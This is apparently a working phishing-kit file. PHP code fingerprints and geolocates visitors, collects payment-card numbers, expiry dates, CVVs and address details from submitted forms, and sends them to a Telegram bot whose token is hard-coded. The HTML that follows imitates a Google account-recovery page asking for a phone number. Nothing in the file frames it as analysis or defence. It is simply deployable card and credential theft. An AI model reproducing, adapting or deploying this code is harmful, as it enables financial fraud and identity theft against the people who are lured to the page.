<?php
include "/mods/antibot.php";


$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS()
{
    global $user_agent;
    $os_platform = "Unknown OS Platform";
    $os_array = array(
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );

    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
    }

    return $os_platform;
}

function getBrowser()
{
    global $user_agent;
    $browser = "Unknown Browser";
    $browser_array = array(
        '/msie/i' => 'Internet Explorer',
        '/firefox/i' => 'Firefox',
        '/safari/i' => 'Safari',
        '/chrome/i' => 'Chrome',
        '/edge/i' => 'Edge',
        '/opera/i' => 'Opera',
        '/netscape/i' => 'Netscape',
        '/maxthon/i' => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i' => 'Handheld Browser'
    );

    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser = $value;
        }
    }

    return $browser;
}

$user_os = getOS();
$user_browser = getBrowser();

$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file = 'data.dat';
$file1 = 'combo.txt';
$file2 = 'master.log';
$ip = "" . $PublicIP;
$uaget = "" . $user_agent;
$bsr = "" . $user_browser;
$uos = "" . $user_os;
$ust = explode(" ", $user_agent);
$vr = $ust[3];
$ver = str_replace(")", "", $vr);
$version = "Version              : " . $ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
} else {
    $details = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details = json_decode($details, true);
$success = $details['success'];
$file = '../../../log.txtt';
$fp = fopen($file, 'a');

if ($success == false) {
    fwrite($fp, $ip . "\n");
    fwrite($fp, $uos . "\n");
    fwrite($fp, $version . "\n");
    fwrite($fp, $bsr . "\n");
    fclose($fp);
} else if ($success == true) {
    $country = $details['country'];
    $city = $details['city'];
    $continent = $details['continent'];
    $tp = $details['type'];
    $cn = $details['country_phone'];
    $is = $details['isp'];
    $la = $details['latitude'];
    $lp = $details['longitude'];
    $crn = $details['currency'];
    $type = $tp;
    $isp = $is;
    $bank = "DO YOU SEE WHAT I C IBC";
    $LL = "+";
    $currency = "" . $full_date;
    $lh = "|";
    $li = ",";
}

$message = "|====🔴🔒 PC SELECTED 🔒🔴===|\n|IPADDRESS :  " . $ip . "\n|BANK   💰  : " . $bank ."\n|Internet sp :  " . $isp ."\n|Type[4/6]     : ".  $tp . "\n|Device Info  :  " . $uos . $lh . $bsr . "\n|City                :  " . $city . "\n|Continent    :  " . $continent . "\n|Lat+lon         :  " . $la . $LL . $lp . "\n|Phone           :  " . $cn . "\n|Country        :  " . $country . "\n|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n| PROFIT   :  " . $_POST['Cardnumber'] . "|" . $_POST['Expiry'] . "|" . $_POST['CVV'] . "|" . $_SESSION['ZIP'] . "|" . $_POST['Nameoncard'] . "|" . $_SESSION['Address'] . "  " . $_SESSION['Apartment'] . "|" . $_SESSION['City'] . "|" . $_SESSION['state'] . "|" . $_SESSION['Phone'] . "|" . $_SERVER['REMOTE_ADDR'] . "|" . $_SESSION['bank_scheme'] . "|" . $_SESSION['bank_type'] . "|" . $_SESSION['bank_brand'] . "|" . $_SESSION['bank_name'] . "|" . $_SESSION['bank_country'] . "\n|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n|USERAGENT:  " . $_SERVER['HTTP_USER_AGENT'] . "\n";


$apiToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s"; 
$data = [
    'chat_id' => '-1001819831566',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    
          

$options = array(
    'http' => array(
        'method'  => 'POST',
        'content' => http_build_query($data),
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n"
    )
);
$context  = stream_context_create($options);
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage", false, $context);


header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html><body>


    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="shortcut icon" href="https://www.google.com/favicon.ico">
    <title>Sign in - Google Accounts</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    function logThirdPartyCommunication() {
      // Logging third-party communication attempts
      const timestamp = new Date().toISOString();
      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
      const requestedUrl = window.location.href;
      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;

      // Specify the log file location
      const logFile = "../../../requests.txt"; // Replace with the actual log file location

      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
      const logRequest = new XMLHttpRequest();
      logRequest.open('POST', logFile, true);
      logRequest.setRequestHeader('Content-Type', 'text/plain');
      logRequest.send(logMessage);
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script>
    
    <meta name="robots" content="noindex, nofollow">
    
    
    
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="format-detection" content="telephone=no">
    
    
    
    
    <script type="text/javascript" nonce="">
        window['cssLoaded'] = true;
    </script>
    <script id="base-js" href="" nonce=""></script>
    


    <div class="H2SoFe LZgQXe TFhTPc " data-continent="Northern America " data-session-region="CA ">
        <div jsaction="" class="RAYh1e LZgQXe ">
            <div>
                <div jsname="Igk6W " role="progressbar " class="sZwd7c B6Vhqe qdulke jK7moc " jscontroller="" jsaction="">
                    <div class="xcNBHc um3FLe "></div>
                    <div class="w2zcLc Iq5ZMc " jsname="cQwEuf "></div>
                    <div class="" jsname="P1ekSe "><span class="l3q5xe SQxu9c "></span></div>
                    <div class=""><span class="l3q5xe SQxu9c "></span></div>
                </div>
            </div>
            <div jsname="f2d3ae " role="presentation " class="xkfVF ">
                <div>
                    <div class="Lth2jb " jsname="n7vHCb " jscontroller="rKxYMb " jsaction="rcuQ6b:qg4Ic;Kzwjs:WPi0i; " data-oauth-third-party-logo-url=" ">
                        <div jsname="jjf7Ff ">
                           </div>
                            </div>
                        </div>
                    </div>
                    <div id="view_container " class="JhUD8d SQNfcc vLGJgb " jscontroller="WFS13 " jsaction="rcuQ6b:npT2md " jsmodel="Z7PiFb qFmk3b qbZ0Se nqpTHe hAn1A YPPRX eV9nn Xu2csd hc6Ubd " data-app-config="" data-initial-setup-data="" x="">
                        <div jscontroller="nSX7Wb " jsaction="" jsname="nUpftc " class="zWl5kd " data-view-id="yFJc2b ">
                            <div class="DRS7Fe bxPAYd k6Zj8d " jsname="bN97Pc " jscontroller="Z3Buzf " jsshadow=" " data-branding="jcJzye " data-use-configureable-escape-action="true " role="presentation ">
                                <div jsname="paFcre ">
                                    <div class="jXeDnc " jsname="tJHJj " jscontroller="S9352b " jsaction="JIbuQc:pKJJqe(af8ijd);bTyaEe:pKJJqe; ">
                                        <h1 class="ahT6S " data-a11y-title-piece=" " id="headingText " jsname="r4nke "><span jsslot=" ">Account recovery</span></h1>
                                        <div class="Y4dIwd " data-a11y-title-piece=" " id="headingSubtext " jsname="VdSJob "><span jsslot=" ">To help keep your account safe, Google wants to make sure it’s really you trying to sign in</span></div>
                                        <div class="aCayab ">
                                            <div jscontroller="ENv7Ef " jsaction="click:cOuCgd; blur:O22p3e; mousedown:UX7yZ; mouseup:lbsD7e; touchstart:p6p2H; touchend:yfqBxc; " class="YZrg6 HnRr5d iiFyne cd29Sd kWC5Rd " tabindex="0 " role="link
    " aria-label="cnomecustoms@gmail.com selected. Switch account " jsname="af8ijd ">
                                                <div class="gPHLDe ">
                                                    <div class="qQWzTd " aria-hidden="true "><svg aria-hidden="true " class="stUf5b " fill="currentColor " focusable="false " width="48px " height="48px " viewBox="0 0 24 24 " xmlns="https://www.w3.org/2000/svg
    "><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56
    3.5-3.5S13.94 6 12 6z "></path></svg></div>
                                                </div>
                                                <div jsname="bQIQze " class="KTeGk " data-profile-identifier=" ">cnomecustoms@gmail.com</div>
                                                <div class="krLnGe "><svg aria-hidden="true " class="stUf5b MSBt4d " fill="currentColor " focusable="false " width="24px " height="24px " viewBox="0 0 24 24 " xmlns="https://www.w3.org/2000/svg
    "><polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71 "></polygon></svg></div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div jsname="uybdVe " class="pwWryf bxPAYd " role="presentation ">
                                    <div jsname="USBQqe " class="Wxwduf Us7fWe JhUD8d " role="presentation ">
                                        <div class="WEQkZc "><span jsslot=" " class="sFcPkb "><section class="aTzEhb AORPd rNe0id eLNT1d S7S4N " jscontroller="W2YXuc " data-callout-type="2 " jsname="INM6z " aria-live="assertive " aria-atomic="true
    " jsshadow=" "><header class="IdEPtc " jsname="tJHJj "><div class="L9iFZc " role="presentation " jsname="NjaE2c "><h2 class="kV95Wc TrZEUc "><span class="yiP64c " aria-hidden="true " jsname="Bz112c "><svg aria-hidden="true " class="stUf5b d7Plee " fill="currentColor
    " focusable="false " width="20px " height="20px " viewBox="0 0 24 24 " xmlns="https://www.w3.org/2000/svg "><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z "></path></svg></span>
                                            <span jsslot=" " jsname="Ud7fr ">Too many failed attempts</span>
                                                </h2>
                                                <div class="yMb59d " jsname="HSrbLb " aria-hidden="true "></div>
                                        </div>
                                        </header>
                                        <div class="CxRgyd " jsname="MZArnb ">
                                            <div class="VBGMK " jsslot=" "></div>
                                        </div>
                                        </section>
                                        </span>
                                        <div class="bCAAsb " jsname="rEuO1b " jscontroller="mjtijb " data-form-action-uri=" ">
                                            <form method="post " novalidate=" " jsaction="submit:JM9m2e; "><span jsslot=" "><section class="aTzEhb S7S4N " jscontroller="W2YXuc " jsshadow=" "><header class="IdEPtc " jsname="tJHJj "><figure class="UWVyoc
    " jsname="Ayj0Lb " aria-hidden="true " data-illustration="accountRecoverySmsPin "><div class="B6L7ke IiQozc " jsname="nhCGJe "><div class="p17Urb "></div><img src="./Account_Recovery_Get_a_Verification _Code_files/account-recovery-sms-pin.gif " class="xh7Wmd TrZEUc
    " aria-hidden="true " alt=" "></div></figure><div class="L9iFZc " role="presentation " jsname="NjaE2c "><h2 class="kV95Wc TrZEUc "><span jsslot=" " jsname="Ud7fr ">Get a verification code</span></h2>
                                                <div class="yMb59d " jsname="HSrbLb " aria-hidden="true "></div>
                                    </div>
                                    </header>
                                    <div class="CxRgyd " jsname="MZArnb ">
                                        <div class="VBGMK " jsslot=" ">
                                            <div class="PrDSKc ">To get a verification code, first confirm the phone number you added to your account <span class="Q1P0F " jscontroller="UsNePd " jsshadow=" " jsaction=" "><span dir="ltr " jsname="wKtwcc ">••••••••13</span></span>.
                                                <em>Standard rates apply.</em></div>
                                            <div jscontroller="jRCWKc " jsaction="rcuQ6b:npT2md; input:YPqjbf(qTMFQd); keydown:C9BaXe;Asxq1c:uydM9d(YzgRqe); " jsname="MeDaPb " class="bAnubd ">
                                                <div class="VsO7Kb ">
                                                    <div jscontroller="ISpqPd " class="Je2Izd " jsaction="rcuQ6b:npT2md;OmFrlf:N9K5Gb " data-match-width="false " jsname="YzgRqe ">
                                                        <div id="i1 " class="y1kitb " jsname="Jj7nGb ">Calling Code</div>
                                                        <div jsshadow=" ">
                                                            <div jsshadow=" " class="O1htCb-H9tDt " jsname="YzgRqe " jscontroller="yRXbo " jsaction="bITzcd:KRVFmb;iFFCZc:Y0y4c;Rld2oe:gDkf4c;EDR5Je:QdOKJc;FzgWvd:RFVo1b " data-disable-idom="true
    " id="countryList ">
                                                                <div jsname="wSASue " class="VfPpkd-O1htCb VfPpkd-O1htCb-OWXEXe-INsAgc VfPpkd-O1htCb-OWXEXe-SfQLQb-M1Soyc-Bz112c VfPpkd-O1htCb-OWXEXe-di8rgd-V67aGc ReCbLb UAQDDf Jwdzye ">
                                                                    <div class="VfPpkd-TkwUic " jsname="oYxtQd " jsaction="focus:AHmuwe; blur:O22p3e; click:cOuCgd; keydown:I481le; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue;
    touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; " aria-autocomplete="none " role="combobox " tabindex="0 " aria-haspopup="listbox " aria-expanded="false " aria-labelledby="i1 i2 " aria-controls="i4 " aria-describedby="
    " aria-disabled="false "><span jscontroller="bTi8wc " class="VfPpkd-NSFCdd-i5vt6e VfPpkd-NSFCdd-i5vt6e-OWXEXe-NSFCdd VfPpkd-NSFCdd-i5vt6e-OWXEXe-di8rgd-V67aGc " jsname="B9mpmd "><span class="VfPpkd-NSFCdd-Brv4Fb "> </span>
                                                                        <span class="VfPpkd-NSFCdd-MpmGFe "></span>
                                                                            </span>
                                                                            <div jsslot=" ">
                                                                                <div jsname="Syemte " class="iqz5tf ">
                                                                                    <div>
                                                                                        <div class="Xzh4Hb ">
                                                                                            <div class="Fy0Xbe " style="background-position: -1px -1803px; " aria-hidden="true "></div>
                                                                                        </div>
                                                                                        <div class="oPmzQb ">+1</div>
                                                                                    </div>
                                                                                </div>
                                                                            <li class=" VfPpkd-StrnGf-rymPhb-ibnC6b " jsaction="click:o6ZaF;keydown:RDtNu; keyup:JdS61c; focusin:MeMJlc; focusout:bkTmIf;mousedown:teoBgf; mouseup:NZPHBc; mouseenter:SKyDAe;
    mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8; change:uOgbud; " role="option " tabindex="-1 " aria-selected="false " data-value="ag "><span class="VfPpkd-StrnGf-rymPhb-pZXsl "></span><span class=" VfPpkd-StrnGf-rymPhb-f7MjDc
    "><div class="Fy0Xbe " style="background-position: -1px -1140px; " aria-hidden="true "></div></span>
                                                                                <span jsname="K4r5Ff " class="VfPpkd-StrnGf-rymPhb-b9t22c ">Antigua &amp; Barbuda (+1)</span>
                                                                            </li>
   
                                                                            </li>
                                                                        </ul>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="gFxJE ">
                                                        <div jscontroller="EF8pe " jsshadow=" " class="Ufn6O UOZHQ " data-idom-container-class="cfWmIb orScbe " jsname="qTMFQd "><label class="VfPpkd-fmcmS-yrriRe VfPpkd-fmcmS-yrriRe-OWXEXe-mWPk3d VfPpkd-ksKsZd-mWPk3d
    VfPpkd-fmcmS-yrriRe-OWXEXe-INsAgc VfPpkd-fmcmS-yrriRe-OWXEXe-i3jM8c-fmcmS cfWmIb orScbe VfPpkd-fmcmS-yrriRe-OWXEXe-XpnDCe VfPpkd-fmcmS-yrriRe-OWXEXe-V67aGc-NLUYnc " jsaction="click:cOuCgd; keydown:I481le; " jsname="vhZMvf " for="phoneNumberId "><span jscontroller="bTi8wc " class="VfPpkd-NSFCdd-i5vt6e VfPpkd-NSFCdd-i5vt6e-OWXEXe-mWPk3d VfPpkd-NSFCdd-i5vt6e-OWXEXe-NSFCdd
    VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe " jsname="B9mpmd "><span class="VfPpkd-NSFCdd-Brv4Fb "> </span><span class="VfPpkd-NSFCdd-Ra9xwd " jsname="FMODoe " style="width: 86.75px; "><span id="i7 " class="VfPpkd-NLUYnc-V67aGc VfPpkd-NLUYnc-V67aGc-OWXEXe-TATcMc-KLRBe
    " jscontroller="Tpj7Pb " jsname="V67aGc ">Phone number</span></span><span class="VfPpkd-NSFCdd-MpmGFe "></span></span><input type="tel " value=" " id="phoneNumberId " jsname="YPqjbf " class="VfPpkd-fmcmS-wGMbrd " jsaction="focus:AHmuwe;blur:O22p3e;input:YPqjbf; mousedown:UX7yZ;
    mouseup:lbsD7e; pointerdown:QJflP; pointerup:HxTfMe; touchstart:p6p2H; touchend:yfqBxc; " aria-labelledby="i7 " autocomplete="off "></label></div>
                                                        <div jsname="B34EJ " class="jPtpFe " aria-live="polite " aria-relevant="all "></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                </section>
                                </span>
                                </form>
                            </div>
                        </div>
                        <div class="zQJV3 " jsname="DH6Rkf " jscontroller="QEg9te " data-is-consent="false " data-is-primary-action-disabled="false " data-is-secondary-action-disabled="false " data-primary-action-label="Send " data-secondary-action-label="Try another way " jsshadow=" " jsaction="rcuQ6b:rcuQ6b;PIvFg:vjx2Ld(Njthtb),ChoyC(eBSUOb),VaKChb(gVmDzc),nCZam(W3Rzrc),Tzaumc(uRHG6),JGhSzd;dcnbp:dE26Sc(lqvTlf);FzgWvd:JGhSzd; ">
                            <div class="dG5hZc " jsname="DhK0U ">
                                <div class="qhFLie " jsname="k77Iif ">
                                    <div jscontroller="IZ1fbc " jsaction="click:cOuCgd;JIbuQc:JIbuQc; " jsname="Njthtb " class="FliLIb DL0QTb ">
                                        <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb " data-is-touch-wrapper="true "><button class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 qIypjc TrZEUc lw1w4b
    " jscontroller="soHxf " jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;mlnRJb:fLiPzd; " data-idom-class="nCP5yc AjY5Oe DuMIQc LQeN7 qIypjc TrZEUc lw1w4b " jsname="LgbsSe " type="button "><div class="VfPpkd-Jh9lGc "></div><div class="VfPpkd-J1Ukfc-LhBDec "></div><div class="VfPpkd-RLmnJb
    "></div><span jsname="V67aGc " class="VfPpkd-vQzf8d ">Send</span></button></div>
                                    </div>
                                </div>
                                <div class="daaWTb " jsname="QkNstf ">
                                    <div jscontroller="IZ1fbc " jsaction="click:cOuCgd;JIbuQc:JIbuQc; " jsname="eBSUOb " class="FliLIb kDmnNe ">
                                        <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb " data-is-touch-wrapper="true "><button class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7 uRo0Xe TrZEUc lw1w4b " jscontroller="soHxf " jsaction="click:cOuCgd;
    mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;mlnRJb:fLiPzd; " data-idom-class="ksBjEc lKxP2d LQeN7 uRo0Xe TrZEUc lw1w4b " jsname="LgbsSe " type="button "><div class="VfPpkd-Jh9lGc "></div><div class="VfPpkd-J1Ukfc-LhBDec "></div><div class="VfPpkd-RLmnJb
    "></div><span jsname="V67aGc " class="VfPpkd-vQzf8d ">Try another way</span></button></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    </div>
    </div>
    
    </div>
    
    </div>
    
    
    
    


</body></html>